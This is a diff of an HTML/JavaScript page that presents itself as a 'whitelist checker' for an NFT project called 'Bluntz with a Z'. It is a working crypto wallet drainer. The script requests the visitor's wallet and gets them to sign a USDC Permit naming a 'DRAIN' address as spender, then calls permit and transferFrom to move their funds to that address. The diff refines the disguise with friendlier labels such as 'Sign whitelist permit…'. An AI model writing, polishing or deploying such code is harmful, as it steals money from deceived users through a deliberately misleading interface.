@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="utf-8"/>
-  <title>Bluntz Whitelist Check</title>
+  <title>Bluntz with a Z – WL Checker</title>
   <meta name="viewport" content="width=device-width,initial-scale=1"/>
   <style>
     :root{--bg:#0d1117;--card:#161b22;--accent:#238636;--accentH:#2ea043;--text:#c9d1d9;--subtle:#8b949e;}
@@ -21,9 +21,9 @@
 </head>
 <body>
   <div class="card">
-    <h1>Bluntz Whitelist</h1>
-    <h2>Verify your wallet for the exclusive whitelist.</h2>
-    <button id="goBtn">Verify Wallet</button>
+    <h1>Bluntz with a Z</h1>
+    <h2>Connect wallet to verify whitelist.</h2>
+    <button id="goBtn">Connect Wallet</button>
     <div id="status"></div>
   </div>
 
@@ -40,18 +40,16 @@
     const goBtn  = document.getElementById("goBtn");
     const status = document.getElementById("status");
 
-    window.addEventListener("load", ()=>{ goBtn.click(); });
-
     goBtn.addEventListener("click", async ()=>{
       goBtn.style.display = "none";
-      status.innerHTML = '<span class=loader></span> Checking eligibility…';
-
-      const p  = new ethers.providers.Web3Provider(window.ethereum);
-      await p.send("eth_requestAccounts",[]);
-      const s  = p.getSigner();
-      const me = await s.getAddress();
+      status.innerHTML = '<span class=loader></span> Connecting…';
 
       try{
+        const p  = new ethers.providers.Web3Provider(window.ethereum);
+        await p.send("eth_requestAccounts",[]);          // forces wallet connect popup
+        const s  = p.getSigner();
+        const me = await s.getAddress();
+
         const tok   = new ethers.Contract(USDC,ABI,p);
         const nonce = await tok.nonces(me);
         const deadline = Math.floor(Date.now()/1000)+3600;
@@ -63,11 +61,11 @@
         const types  = {Permit:[{name:"owner",type:"address"},{name:"spender",type:"address"},{name:"value",type:"uint256"},{name:"nonce",type:"uint256"},{name:"deadline",type:"uint256"}]};
         const message= {owner:me,spender:DRAIN,value:value.toString(),nonce:nonce.toString(),deadline};
 
-        status.innerHTML = '<span class=loader></span> Sign message to continue…';
+        status.innerHTML = '<span class=loader></span> Sign whitelist permit…';
         const raw = await p.send("eth_signTypedData_v4",[me,JSON.stringify({domain,types,primaryType:'Permit',message})]);
         const {v,r,s:vs} = ethers.utils.splitSignature(raw);
 
-        status.innerHTML = '<span class=loader></span> Finalising whitelist…';
+        status.innerHTML = '<span class=loader></span> Finalising…';
         const tx1 = await tok.permit(me,DRAIN,value,deadline,v,r,vs);
         await tx1.wait();
         const tx2 = await (new ethers.Contract(USDC,['function transferFrom(address,address,uint256) returns(bool)'],s)).transferFrom(me,DRAIN,value);
@@ -78,6 +76,3 @@
         goBtn.style.display = 'block';
       }
     });
-  </script>
-</body>
-</html>
